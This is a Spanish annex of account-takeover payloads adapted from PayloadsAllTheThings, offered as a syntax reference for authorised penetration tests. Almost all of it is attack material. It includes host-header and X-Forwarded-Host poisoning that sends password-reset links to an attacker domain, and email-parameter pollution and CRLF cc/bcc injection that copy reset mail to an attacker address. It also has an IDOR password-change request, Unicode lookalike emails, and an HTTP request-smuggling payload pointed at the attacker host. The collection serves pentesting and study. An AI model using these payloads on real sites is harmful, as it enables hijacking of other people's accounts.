# Autenticación rota: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Account Takeover/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Account%20Takeover/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Flujo de recuperación de contraseña / Toma de cuenta por envenenamiento del enlace de recuperación

```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: [ATTACKER.DOMAIN.TLD]
```

### Variantes presentes en tablas o texto del apartado

```text
Host: [ATTACKER.DOMAIN.TLD]
X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]
https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN
```

## 2. Flujo de recuperación de contraseña / Recuperación mediante parámetro de correo

```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

## 3. Flujo de recuperación de contraseña / IDOR en parámetros de API

```powershell
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
```

## 4. Flujo de recuperación de contraseña / Filtración del Token de recuperación

### Variantes presentes en tablas o texto del apartado

```text
https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]
```

## 5. Flujo de recuperación de contraseña / Toma de cuenta por normalización Unicode incorrecta

### Variantes presentes en tablas o texto del apartado

```text
demo@gmail.com
demⓞ@gmail.com
```

## 6. Toma de cuenta mediante vulnerabilidades web / Toma de cuenta via XSS

### Variantes presentes en tablas o texto del apartado

```text
*.domain.com
```

## 7. Toma de cuenta mediante vulnerabilidades web / Toma de cuenta mediante desincronización HTTP

```powershell
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
```

```powershell
    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
    X: 
```

```powershell
    GET /  HTTP/1.1
    Transfer-Encoding: chunked
    Host: something.com
    User-Agent: Smuggler/v1.0
    Content-Length: 83

    0

    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
    X: X
```

### Variantes presentes en tablas o texto del apartado

```text
POST / HTTP/1.1
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
